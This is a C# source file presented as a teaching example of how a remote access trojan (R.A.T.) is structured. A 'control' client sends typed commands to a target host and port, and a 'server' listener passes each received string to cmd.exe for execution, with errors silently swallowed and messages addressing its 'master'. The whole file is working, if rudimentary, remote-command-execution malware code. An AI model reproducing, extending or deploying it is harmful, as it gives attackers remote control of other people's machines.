

// Hey, this code is purely for those who want to understand the
// idea of how a R.A.T. structures itself code wise.


// Author: Dashie
// Version: 1.0


using System;
using System.IO;
using System.Net;
using System.Text;
using System.Net.Sockets;
using System.Diagnostics;


namespace Reverse_Shell
{
    static class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-");
            Console.WriteLine("> Use one of the following commands:");
            Console.WriteLine("> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-");
            Console.WriteLine("> control   -=-   Control a server running this server.");
            Console.WriteLine("> server    -=-   Start our server.");
            Console.WriteLine("> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n");

            while (true)
            {
                Console.Write("$(Option)> ");
                string option = Console.ReadLine().ToLower();

                if (option.Equals("control"))
                    Client.control();

                else if (option.Equals("server"))
                    Server.start();
            };
        }
    };


    class Client
    {
        // I did not implement a validation module on purpose.
        // I am too lazy to do this right now ;p

        public static void control()
        {
            Console.Write("$(Target)> ");
            string host = Console.ReadLine();

            Console.Write("$(Port)> ");
            int.TryParse(Console.ReadLine(), out int port);

            Console.WriteLine($"[-] Connecting to {host}:{port} ....");

            TcpClient client = new TcpClient();
            client.Connect(host, port);

            if(!client.Connected)
            {
                Console.WriteLine("[!] A connection could not be estabilished with the host!");
                return;
            };

            Console.WriteLine($"[+] You are now connected with {host}:{port} !");
            Console.WriteLine($"[-] Starting the interactive Dash Shell ....");

            while (true)
            {
                if(!client.Connected)
                {
                    client.Close();
                    client = new TcpClient();
                    client.Connect(host, port);
                    
                    continue;
                };

                Stream stream = client.GetStream();

                Console.Write("$(Dash Society/rev_shell)> ");
                byte[] command = Encoding.ASCII.GetBytes(Console.ReadLine());

                stream.Write(command, 0, command.Length);

                Console.WriteLine("[-] Command has been sent, awaiting response ....");

                byte[] cache = new byte[100];
                stream.Read(cache, 0, 100);

                if(Encoding.ASCII.GetString(cache).Contains("OK!"))
                {
                    Console.WriteLine("[+] The command was received and was executed!");
                }

                else
                {
                    Console.WriteLine("[-] The command was not received.");
                };

                stream.Close();
            };
        }
    };
    

    class Server
    {
        public static void start()
        {
            Console.WriteLine("[-] Starting local server ....");

            int rand_port = new Random().Next(10000, 65535);

            TcpListener listener = new TcpListener(IPAddress.Parse("127.0.0.1"), rand_port);
            listener.Start();

            Console.WriteLine($"[+] Server is now running on 127.0.0.1:{rand_port}");

            while (true)
            {
                try
                {
                    Console.WriteLine("[-] Awaiting my master ....");

                    Socket sock = listener.AcceptSocket();

                    byte[] cache = new byte[100];

                    sock.Receive(cache);

                    Console.WriteLine("[+] Master has sent me a command.");
                    Console.WriteLine("[-] Executing it ....");

                    string command = "/C " + Encoding.ASCII.GetString(cache);

                    Process shell = new Process()
                    {
                        StartInfo = new ProcessStartInfo()
                        {
                            FileName = "C:\\Windows\\System32\\cmd.exe",
                            Arguments = command,
                        },
                    };

                    shell.Start();

                    sock.Send(Encoding.ASCII.GetBytes("OK!"));
                    sock.Close();

                    Console.WriteLine("[+] I have done what the master had told me to.");
                }

                catch
                {
                    // Silencing Potential Errors
                };
            };
        }
    };
};
